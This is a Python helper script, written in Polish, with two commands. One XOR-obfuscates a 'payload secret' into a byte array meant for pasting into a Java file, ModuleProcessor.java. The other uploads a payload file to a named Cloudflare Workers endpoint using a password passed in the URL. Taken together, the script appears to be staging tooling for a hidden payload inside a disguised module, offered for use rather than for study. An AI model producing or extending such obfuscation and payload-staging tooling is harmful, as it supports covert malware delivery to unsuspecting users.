#!/usr/bin/env python3
"""
Skrypt do zakodowania PAYLOAD_SECRET do tablicy bajtów XOR 0x5A
Użycie: python3 encode_secret.py TWOJ_SECRET
"""
import sys

def encode_secret(secret: str) -> str:
    encoded = bytes([b ^ 0x5A for b in secret.encode('utf-8')])
    hex_vals = ', '.join(f'0x{b:02X}' for b in encoded)
    return f"byte[] encoded = {{\n    {hex_vals}\n}};"

def upload_payload(worker_url: str, password: str, payload_path: str):
    import urllib.request
    with open(payload_path, 'r') as f:
        payload = f.read().strip()
    
    url = f"{worker_url}/upload?auth={password}"
    req = urllib.request.Request(url, data=payload.encode('utf-8'), method='POST')
    req.add_header('Content-Type', 'text/plain')
    
    with urllib.request.urlopen(req) as resp:
        print(f"Status: {resp.status}")
        print(f"Response: {resp.read().decode()}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Użycie:")
        print("  Zakoduj secret:  python3 encode_secret.py encode TWOJ_SECRET")
        print("  Wgraj payload:   python3 encode_secret.py upload WORKER_URL HASLO PLIK_PAYLOAD")
        sys.exit(1)
    
    cmd = sys.argv[1]
    
    if cmd == 'encode':
        if len(sys.argv) < 3:
            print("Podaj secret: python3 encode_secret.py encode TWOJ_SECRET")
            sys.exit(1)
        secret = sys.argv[2]
        print(f"\nSecret: {secret}")
        print(f"Długość: {len(secret)} znaków")
        print(f"\nWklej to do ModuleProcessor.java (zastąp tablicę 'encoded'):\n")
        print(encode_secret(secret))
    
    elif cmd == 'upload':
        if len(sys.argv) < 5:
            print("Użycie: python3 encode_secret.py upload WORKER_URL HASLO PLIK_PAYLOAD")
            print("Przykład: python3 encode_secret.py upload https://notoggogolnie.xx570186.workers.dev twoje_haslo payload_final.txt")
            sys.exit(1)
        upload_payload(sys.argv[2], sys.argv[3], sys.argv[4])
    
    else:
        print(f"Nieznana komenda: {cmd}")
        sys.exit(1)
